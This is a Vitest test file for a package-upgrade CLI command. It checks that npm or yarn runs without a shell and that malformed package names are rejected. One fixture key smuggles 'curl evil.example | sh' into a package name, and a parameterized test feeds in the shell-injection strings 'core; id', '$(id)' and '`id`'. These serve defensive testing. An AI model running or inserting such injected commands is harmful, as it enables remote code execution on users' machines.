import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const mocks = vi.hoisted(() => ({ spawnSync: vi.fn() }));
vi.mock("node:child_process", () => ({ spawnSync: mocks.spawnSync }));

import { upgradeCommand } from "../../src/commands/upgrade.js";

const EVIL_KEY = "@tuttiai/x; curl evil.example | sh";
const HINT =
  'Hint: use a voice name like "slack", a scoped package like "@acme/voice", or add a version like "@acme/voice@^1.2.0".';

describe("upgradeCommand", () => {
  let dir: string;
  let log: ReturnType<typeof vi.spyOn>;
  let warn: ReturnType<typeof vi.spyOn>;
  let error: ReturnType<typeof vi.spyOn>;

  function writeDeps(dependencies: Record<string, string>): void {
    writeFileSync(join(dir, "package.json"), JSON.stringify({ dependencies }));
  }

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "tutti-upgrade-"));
    writeDeps({ "@tuttiai/core": "^1.0.0", "@tuttiai/types": "^1.0.0" });
    vi.spyOn(process, "cwd").mockReturnValue(dir);
    vi.spyOn(process, "exit").mockImplementation((code) => {
      throw new Error(`exit ${String(code)}`);
    });
    log = vi.spyOn(console, "log").mockImplementation(() => undefined);
    warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    error = vi.spyOn(console, "error").mockImplementation(() => undefined);
    mocks.spawnSync.mockReset();
    mocks.spawnSync.mockReturnValue({ status: 0, stdout: null });
  });

  afterEach(() => {
    vi.restoreAllMocks();
    rmSync(dir, { recursive: true, force: true });
  });

  it("upgrades every @tuttiai package with npm and no shell", () => {
    upgradeCommand();

    expect(mocks.spawnSync).toHaveBeenCalledTimes(1);
    expect(mocks.spawnSync).toHaveBeenCalledWith(
      "npm",
      ["install", "@tuttiai/core@latest", "@tuttiai/types@latest"],
      expect.objectContaining({ cwd: dir, shell: false }),
    );
  });

  it("upgrades one package with yarn when yarn.lock is present", () => {
    writeFileSync(join(dir, "yarn.lock"), "");
    upgradeCommand("core");

    expect(mocks.spawnSync).toHaveBeenCalledWith(
      "yarn",
      ["add", "@tuttiai/core@latest"],
      expect.objectContaining({ shell: false }),
    );
  });

  it("skips an invalid package.json key with a warning and never passes it on", () => {
    writeDeps({ [EVIL_KEY]: "1.0.0", "@tuttiai/core": "^1.0.0" });
    upgradeCommand();

    expect(mocks.spawnSync.mock.calls[0]?.[1]).toEqual(["install", "@tuttiai/core@latest"]);
    expect(JSON.stringify(mocks.spawnSync.mock.calls)).not.toContain("curl");
    expect(warn).toHaveBeenCalledWith(expect.stringContaining(`Skipping ${JSON.stringify(EVIL_KEY)}`));
  });

  it.each([
    ["semicolon", "core; id"],
    ["command substitution", "$(id)"],
    ["backtick", "`id`"],
  ])("rejects a target with a %s, exits 1 and runs nothing", (_label, target) => {
    expect(() => upgradeCommand(target)).toThrow("exit 1");

    expect(mocks.spawnSync).not.toHaveBeenCalled();
    expect(error).toHaveBeenCalledWith(expect.stringContaining(`Invalid package name: ${JSON.stringify(target)}`));
    expect(error).toHaveBeenCalledWith(expect.stringContaining(HINT));
  });

  it("exits 1 for a valid target that is not installed", () => {
    expect(() => upgradeCommand("slack")).toThrow("exit 1");
    expect(mocks.spawnSync).not.toHaveBeenCalled();
  });

  it("exits 1 with the failed command and a manual hint when npm fails", () => {
    mocks.spawnSync.mockReturnValue({ status: 1, stdout: null });

    expect(() => upgradeCommand("core")).toThrow("exit 1");
    expect(error).toHaveBeenCalledWith(
      expect.stringContaining("npm install @tuttiai/core@latest failed (exit code 1)."),
    );
    expect(log).toHaveBeenCalledWith(expect.stringContaining("Run manually: npm install @tuttiai/core@latest"));
  });

  it("exits 1 with a PATH hint when npm cannot be found", () => {
    const enoent = Object.assign(new Error("spawnSync npm ENOENT"), { code: "ENOENT" });
    mocks.spawnSync.mockReturnValue({ status: null, stdout: null, error: enoent });

    expect(() => upgradeCommand()).toThrow("exit 1");
    expect(error).toHaveBeenCalledWith(
      expect.stringContaining("Could not run npm. Is Node.js/npm installed and on your PATH?"),
    );
  });
});
